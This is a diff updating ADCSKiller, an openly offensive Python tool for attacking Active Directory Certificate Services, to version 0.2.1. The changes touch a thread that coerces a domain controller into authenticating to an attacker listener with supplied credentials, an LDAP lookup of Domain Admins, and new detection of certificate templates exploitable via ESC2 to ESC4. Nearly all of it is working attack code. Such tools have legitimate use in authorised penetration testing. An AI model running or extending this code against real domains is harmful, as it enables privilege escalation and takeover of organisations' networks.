@@ -33,7 +33,7 @@ SOFTWARE.
 
 __author__ = "grimlockx"
 __license__ = "MIT"
-__version__ = "0.2"
+__version__ = "0.2.1"
 
 
 import argparse
@@ -62,7 +62,7 @@ class CertipyRelay(threading.Thread):
 
         
 class Coercer(threading.Thread):
-    def __init__(self, threadID, name, domain, username, password, target_dc, listener_ip):
+    def __init__(self, threadID, name, domain, username, password, target_dc, lhost):
         threading.Thread.__init__(self)
         self.threadID = threadID
         self.name = name
@@ -70,12 +70,12 @@ class Coercer(threading.Thread):
         self.username = username
         self.password = password
         self.target_dc = target_dc
-        self.listener_ip = listener_ip
+        self.lhost = lhost
         
     def run(self):
-        print(f'[+] Started coercion from {self.target_dc} to {self.listener_ip}')
-        subprocess.run(["Coercer", "coerce", "-u", self.username, "-p", self.password, "-d", self.domain, "-t", self.target_dc, "-l", self.listener_ip, "--always-continue"], capture_output=True, text=True).stdout
-        print(f'[+] Finished coercion from {self.target_dc} to {self.listener_ip}')
+        print(f'[+] Started coercion from {self.target_dc} to {self.lhost}')
+        subprocess.run(["Coercer", "coerce", "-u", self.username, "-p", self.password, "-d", self.domain, "-t", self.target_dc, "-l", self.lhost, "--always-continue"], capture_output=True, text=True).stdout
+        print(f'[+] Finished coercion from {self.target_dc} to {self.lhost}')
         
 class Exploit:
     def __init__(self, domain, username, password, target, level, lhost) -> None:
@@ -165,7 +165,7 @@ class Exploit:
             parsed_entry = entry.decode('utf-8').split(',')
             self.__domain_admins.append(parsed_entry[0][3:])
 
-        # Backup ldap search if searching via sid did not return any results
+        # Fallback LDAP search if searching via sid did not return any results
         if not self.__domain_admins:
             print(f"[*] Getting Domain Administrators of {self.__domain} using Common Name 'Domain Admins'")
             self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(memberOf=cn=Domain Admins,OU=Groups,{self.__domain_cn})', attributes = ['sAMAccountName'])
@@ -219,7 +219,28 @@ class Exploit:
                         self.__vulnerable_certificate_templates["ESC1"] = []
                     
                     self.__vulnerable_certificate_templates["ESC1"].append(template["Template Name"])
-                    print(f"Certificate templates vulnerable to ESC1: {self.__vulnerable_certificate_templates['ESC1']}\n")
+
+                if "ESC2" in vulnerabilities:
+                    if "ESC2" not in self.__vulnerable_certificate_templates:
+                        self.__vulnerable_certificate_templates["ESC2"] = []
+                    
+                    self.__vulnerable_certificate_templates["ESC2"].append(template["Template Name"])
+
+                if "ESC3" in vulnerabilities:
+                    if "ESC3" not in self.__vulnerable_certificate_templates:
+                        self.__vulnerable_certificate_templates["ESC3"] = []
+                    
+                    self.__vulnerable_certificate_templates["ESC3"].append(template["Template Name"])
+
+                if "ESC4" in vulnerabilities:
+                    if "ESC4" not in self.__vulnerable_certificate_templates:
+                        self.__vulnerable_certificate_templates["ESC4"] = []
+                    
+                    self.__vulnerable_certificate_templates["ESC4"].append(template["Template Name"])
+
+        if self.__vulnerable_certificate_templates:
+            print('[+] Found vulnerable certificate templates')
+            print(self.__vulnerable_certificate_templates)
                     
         return self.__vulnerable_certificate_templates
     
@@ -302,7 +323,7 @@ if __name__ == "__main__":
 
         """)
 
-    print("\nADCSKiller v0.2 - by Maurice Fielenbach (grimlockx) - Hexastrike Cybersecurity UG (haftungsbeschränkt)\n")
+    print("\nADCSKiller v0.2.1 - by Maurice Fielenbach (grimlockx) - Hexastrike Cybersecurity UG (haftungsbeschränkt)\n")
     parser = argparse.ArgumentParser()
     parser.add_argument('-d', '--domain', dest='domain',type=str, required=True, help='Target domain name. Use FQDN')
     parser.add_argument('-u', '--username', dest='username',type=str, required=True, help='Username')
